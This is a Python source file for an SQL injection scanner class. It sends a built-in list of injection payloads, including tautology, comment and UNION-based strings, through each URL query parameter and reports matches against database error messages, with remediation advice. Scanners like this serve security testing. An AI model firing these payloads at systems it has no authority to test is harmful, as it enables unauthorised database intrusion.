import requests
from typing import List, Dict, Any
from models.schemas import VulnerabilitySchema, SeverityEnum


class SQLInjectionScanner:
    """SQL Injection vulnerability scanner"""

    PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
    ]

    ERROR_PATTERNS = [
        "SQL syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "ORA-01756",
        "PostgreSQL query failed",
        "pg_query()",
        "SQLServer JDBC Driver",
        "Microsoft OLE DB Provider",
        "Unclosed quotation mark",
        "ODBC SQL Server Driver",
    ]

    def __init__(self, timeout: int = 10):
        self.timeout = timeout

    def scan(self, url: str, depth: int = 1) -> List[VulnerabilitySchema]:
        """Scan URL for SQL injection vulnerabilities"""
        vulnerabilities = []

        try:
            # Parse URL to extract parameters
            if '?' not in url:
                return vulnerabilities

            base_url, query_string = url.split('?', 1)
            params = {}
            for param in query_string.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    params[key] = value

            # Test each parameter
            for param_name, original_value in params.items():
                for payload in self.PAYLOADS:
                    test_params = params.copy()
                    test_params[param_name] = payload

                    try:
                        response = requests.get(
                            base_url,
                            params=test_params,
                            timeout=self.timeout,
                            allow_redirects=False
                        )

                        # Check for SQL error patterns
                        if any(pattern.lower() in response.text.lower() for pattern in self.ERROR_PATTERNS):
                            vulnerabilities.append(
                                VulnerabilitySchema(
                                    name="SQL Injection",
                                    description=f"Potential SQL injection vulnerability detected in parameter '{param_name}'",
                                    severity=SeverityEnum.CRITICAL,
                                    cvss_score=9.8,
                                    url=url,
                                    parameter=param_name,
                                    method="GET",
                                    evidence=response.text[:500],
                                    payload=payload,
                                    remediation="Use parameterized queries or prepared statements. Validate and sanitize all user input.",
                                    references=[
                                        "https://owasp.org/www-community/attacks/SQL_Injection",
                                        "https://cwe.mitre.org/data/definitions/89.html"
                                    ],
                                    cwe_id="CWE-89"
                                )
                            )
                            break  # Found vulnerability in this parameter

                    except requests.RequestException:
                        continue

        except Exception as e:
            print(f"Error scanning for SQL injection: {e}")

        return vulnerabilities
